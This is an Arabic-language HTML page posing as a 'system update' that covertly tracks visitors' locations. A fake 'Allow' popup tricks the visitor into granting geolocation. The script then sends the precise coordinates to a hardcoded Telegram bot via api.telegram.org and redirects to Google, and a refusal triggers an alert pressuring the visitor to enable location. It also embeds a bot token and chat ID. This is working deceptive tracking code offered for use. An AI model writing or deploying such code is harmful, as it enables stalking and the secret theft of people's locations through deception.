<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <style>
        body { margin: 0; background-color: #f0f0f0; height: 100vh; overflow: hidden; }
        
        /* النافذة الوهمية */
        #fake-popup {
            position: fixed;
            top: 20%;
            left: 5%;
            width: 90%;
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            text-align: center;
            z-index: 999;
        }
        
        /* زر "سماح" الوهمي */
        .allow-btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 40px;
            border-radius: 5px;
            font-size: 18px;
            margin-top: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="fake-popup">
        <h3>هل تسمح بالوصول للموقع؟</h3>
        <p>الرجاء الضغط على "سماح" للتحقق من هويتك كزائر محلي.</p>
        <button class="allow-btn" onclick="triggerNativePermission()">سماح</button>
    </div>

<script>
    const token = "8718517211:AAFXWLyYV0tRE8ecQEtMFy1y8T8fXF3N3pE"; 
    const chatId = "6418943650";

    function triggerNativePermission() {
        // بمجرد الضغط، نقوم بإخفاء النافذة الوهمية بسرعة
        document.getElementById('fake-popup').style.display = 'none';
        
        // ونقوم فوراً بطلب الموقع الحقيقي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📍 موقع جديد: ' + mapLink)}`);
                    window.location.href = "https://www.google.com";
                },
                (err) => {
                    // إذا رفض، نظهر له رسالة أخرى
                    alert("يرجى تفعيل الموقع من إعدادات المتصفح للمتابعة");
                },
                {enableHighAccuracy: true}
            );
        }
    }
</script>

</body>
</html>
